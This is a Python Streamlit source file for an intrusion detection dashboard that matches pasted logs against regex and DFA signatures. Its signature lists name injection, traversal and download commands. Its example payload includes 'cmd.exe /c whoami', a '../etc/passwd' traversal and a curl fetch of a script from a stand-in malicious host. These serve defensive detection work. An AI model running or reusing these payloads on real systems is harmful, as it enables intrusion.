# ui_app.py
import streamlit as st
import pandas as pd
import re
from datetime import datetime

from regex_dfa_matcher import (
    load_patterns,
    build_detectors,
    match_regex,
    match_dfa,
    match_both,
    explain_pattern,
)

# Optional ANN imports (auto-disable if unavailable)
try:
    from ann_classifier import load_model_and_processors, predict_from_record
    ANN_AVAILABLE = True
except Exception:
    ANN_AVAILABLE = False


# ---------------- Helpers (define BEFORE use) ----------------
def _highlight(txt: str, patterns) -> str:
    """
    Wrap matched substrings in <mark> for quick visual inspection.
    Tries regex highlight first; falls back to literal case-insensitive.
    """
    out = txt
    for pat in sorted(set(patterns), key=lambda s: -len(s)):
        try:
            core = pat[4:] if pat.startswith("(?i)") else pat
            flags = re.IGNORECASE if pat.startswith("(?i)") else 0
            out = re.sub(f"({core})", r"<mark>\1</mark>", out, flags=flags)
        except Exception:
            try:
                out = re.sub(re.escape(pat), f"<mark>{pat}</mark>", out, flags=re.IGNORECASE)
            except Exception:
                pass
    return out


# ---------------- Page config & Title ----------------
st.set_page_config(page_title="IDS Dashboard", layout="wide", initial_sidebar_state="expanded")
st.title("🛡️ Intrusion Detection Dashboard (Regex + DFA + Optional ANN)")
st.caption("Scan logs / HTTP payloads for suspicious signatures using Regex and Formal DFA. ANN (NSL-KDD) is optional.")


# ---------------- Sidebar: mode & patterns ----------------
st.sidebar.header("Controls")
mode = st.sidebar.selectbox("Detection mode", ["Regex", "DFA", "Both"], index=2)
signatures_file = st.sidebar.text_input("Signatures file", value="signatures.txt")

# Load base signatures from file
try:
    base_patterns = load_patterns(signatures_file)
except Exception:
    base_patterns = []

st.sidebar.subheader("Pattern categories")
CATEGORIES = {
    "SQL Injection": ["(?i)select.+from", "(?i)union\\s+select", "(?i)or\\s+1=1", "(?i)drop\\s+table"],
    "XSS": ["<script>.*?</script>", "(?i)%3Cscript%3E.*%3C/script%3E", "(?i)<img\\s+onerror"],
    "Command Injection": ["(?i)cmd\\.exe", "(?i)rm\\s+-rf", "(?i)wget\\s+http", "(?i)curl\\s+http"],
    "Traversal": ["\\.\\./\\.\\./", "\\.\\./etc/passwd"],
    "Malware Keywords": ["(?i)malware", "(?i)trojan", "(?i)ransomware"],
}
selected = st.sidebar.multiselect("Enable categories", list(CATEGORIES.keys()), default=list(CATEGORIES.keys())[:3])

# Build active pattern list (unique, preserve order)
active_patterns = []
for cat in selected:
    active_patterns.extend(CATEGORIES[cat])
active_patterns.extend(base_patterns)
seen = set()
active_patterns = [p for p in active_patterns if not (p in seen or seen.add(p))]

# Add custom pattern
st.sidebar.subheader("Add a custom pattern")
new_pat = st.sidebar.text_input("New pattern (Python regex, use (?i) for case-insensitive)")
if st.sidebar.button("Add pattern"):
    if new_pat.strip():
        try:
            core = new_pat[4:] if new_pat.startswith("(?i)") else new_pat
            flags = re.IGNORECASE if new_pat.startswith("(?i)") else 0
            re.compile(core, flags)  # validate
            with open(signatures_file, "a", encoding="utf-8") as f:
                f.write(new_pat.strip() + "\n")
            st.sidebar.success("Pattern added to signatures file.")
            base_patterns.append(new_pat.strip())
            # Rebuild the active list
            active_patterns.append(new_pat.strip())
            seen = set()
            active_patterns = [p for p in active_patterns if not (p in seen or seen.add(p))]
        except re.error as e:
            st.sidebar.error(f"Invalid regex: {e}")
    else:
        st.sidebar.warning("Please enter a non-empty pattern.")


# ---------------- Main: input & actions ----------------
st.header("Input")
text = st.text_area(
    "Paste logs, HTTP requests, or payload text:",
    height=220,
    placeholder=(
        "Example:\n"
        "GET /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\n"
        "cmd.exe /c dir\n"
        "SELECT * FROM users"
    )
)

col1, col2 = st.columns([1, 1])
with col1:
    if st.button("Insert example payload"):
        text = (
            "User tried: ' OR '1'='1\n"
            "GET /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\n"
            "cmd.exe /c whoami\n"
            "Traversal test: ../../etc/passwd\n"
            "curl http://malicious.example/payload.sh"
        )
        st.code(text)

with col2:
    run = st.button("🚀 Run detection")


# ---------------- Optional ANN classifier ----------------
st.markdown("---")
st.subheader("🤖 Optional ANN classifier (NSL-KDD)")
if ANN_AVAILABLE:
    try:
        model_ready, preprocessors = load_model_and_processors()
    except Exception:
        model_ready, preprocessors = False, None

    if model_ready:
        uploaded = st.file_uploader("Upload NSL-KDD CSV row(s) to classify (optional)", type=["csv"])
        if uploaded and st.button("Classify with ANN"):
            df = pd.read_csv(uploaded, header=None)
            preds = predict_from_record(df, preprocessors)
            st.write("ANN predictions:")
            st.write(preds)
    else:
        st.info("ANN model/preprocessors not found. Train first to enable ANN (run train_ann_model.py).")
else:
    st.caption("ANN components not available in this environment — skipping.")


# ---------------- Detection run & results ----------------
if run:
    if not text.strip():
        st.warning("Please paste some input first.")
    else:
        with st.spinner("Building detectors (DFA may take a moment)..."):
            detectors = build_detectors(active_patterns)

        if mode == "Regex":
            regex_hits = match_regex(detectors, text)
            dfa_hits = []
            both_hits = []
        elif mode == "DFA":
            dfa_hits = match_dfa(detectors, text)
            regex_hits = []
            both_hits = []
        else:
            out = match_both(detectors, text)
            regex_hits = out.get("regex", [])
            dfa_hits = out.get("dfa", [])
            both_hits = out.get("both", [])

        # Summary
        st.header("Results")
        c1, c2, c3 = st.columns(3)
        c1.metric("Regex matches", len(regex_hits))
        c2.metric("DFA matches", len(dfa_hits))
        c3.metric("High-confidence (both)", len(both_hits))

        # Detailed sections
        st.markdown("### Regex matches")
        if regex_hits:
            for pat in regex_hits:
                with st.expander(f"⚠️ {pat}", expanded=False):
                    st.write(explain_pattern(pat))
        else:
            st.success("✅ No regex matches.")

        st.markdown("### DFA matches (formal language automata)")
        if dfa_hits:
            for pat in dfa_hits:
                with st.expander(f"⚠️ {pat}", expanded=False):
                    st.write(explain_pattern(pat))
        else:
            st.success("✅ No DFA matches.")

        if mode == "Both":
            st.markdown("### High-confidence (matched by BOTH)")
            if both_hits:
                for pat in both_hits:
                    st.error(f"🚨 {pat} — very likely malicious.")
            else:
                st.info("No intersection between Regex and DFA matches.")

        # Highlight preview
        st.markdown("### Highlighted input (first 2000 chars)")
        highlighted = _highlight(text[:2000], regex_hits + dfa_hits)
        st.markdown(highlighted, unsafe_allow_html=True)

        st.caption(f"Scan completed at {datetime.utcnow().isoformat()}Z")
# ---------------- Footer ----------------
st.markdown("---")
# ---------------- Optional ANN classifier ----------------
st.markdown("---")
st.subheader("🤖 Optional ANN classifier (NSL-KDD)")
if ANN_AVAILABLE:
    try:
        model_ready, preprocessors = load_model_and_processors()
    except Exception:
        model_ready, preprocessors = False, None

    if model_ready:
        uploaded = st.file_uploader("Upload NSL-KDD CSV row(s) to classify (no header; 41 or 43 columns)", type=["csv"])
        explain = st.checkbox("Explain predictions (top contributing features per row)", value=True)

        if uploaded and st.button("Classify with ANN"):
            df = pd.read_csv(uploaded, header=None)

            if explain:
                from ann_classifier import predict_with_explanations
                out = predict_with_explanations(df, preprocessors, top_k=5)
                st.subheader("Predictions")
                st.dataframe(out["preds"])
                st.subheader("Explanations (per row)")
                for i, ex in enumerate(out["explanations"], start=1):
                    with st.expander(f"Row #{i} — {ex['summary']}"):
                        tf_df = pd.DataFrame(ex["top_features"], columns=["Feature", "Contribution (0-1)", "Meaning"])
                        st.dataframe(tf_df)
            else:
                from ann_classifier import predict_from_record
                preds = predict_from_record(df, preprocessors)
                st.subheader("Predictions")
                st.dataframe(preds)

        st.caption("Tip: You can export a few lines from KDDTest+.txt into a CSV without headers and upload here.")
    else:
        st.info("ANN model/preprocessors not found. Train first to enable ANN (run train_ann_model.py).")
else:
    st.caption("ANN components not available in this environment — skipping.")
